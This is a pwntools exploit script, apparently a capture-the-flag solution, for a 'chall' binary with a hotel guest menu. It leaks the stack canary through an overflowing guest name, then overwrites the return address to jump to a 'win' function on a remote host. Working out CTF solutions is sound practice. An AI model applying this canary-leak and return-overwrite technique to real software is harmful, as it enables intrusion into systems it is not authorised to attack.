#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

exe = context.binary = ELF(args.EXE or './chall')
context.terminal = ["tmux", "splitw", "-h"]

host = args.HOST or '13.212.234.124'
port = int(args.PORT or 11102)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
break *0x00401aa6
continue
'''.format(**locals())

io = start()

def check_in(index):
    io.sendline(b"1")
    io.sendafter(b"Enter guest name: ", b"A" * 41)
    io.sendlineafter(b"Enter room number: ", str(index).encode())
    io.clean()

def get_canary():
    io.sendline(b"2")
    leak = u64(io.recvline_startswith(b"Guest 10").split(b",")[0].split(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")[1][0:7].rjust(8, b"\x00"))
    io.clean()
    return leak

def exit_program():
    io.sendline(b"5")

def jump_to(canary, ret_to):
    io.sendline(b"4")
    io.sendlineafter(b"Enter room number to edit: ", b"9")
    io.sendlineafter(b"Enter new guest name: ", b"A" * 40 + p64(canary) + b"A" * 8 + p64(ret_to))
    io.sendlineafter(b"Enter new room number: ", b"9")
    io.clean()
    exit_program()

for i in range(10):
    check_in(i)

canary = get_canary()

print("Leaked Canary: ", hex(canary))
print("Cyclic found (ret): ", cyclic_find("oaaapaaa"))
print("Cyclic found (canary): ", cyclic_find("kaaalaaa"))

jump_to(canary, exe.symbols["win"])

io.interactive()
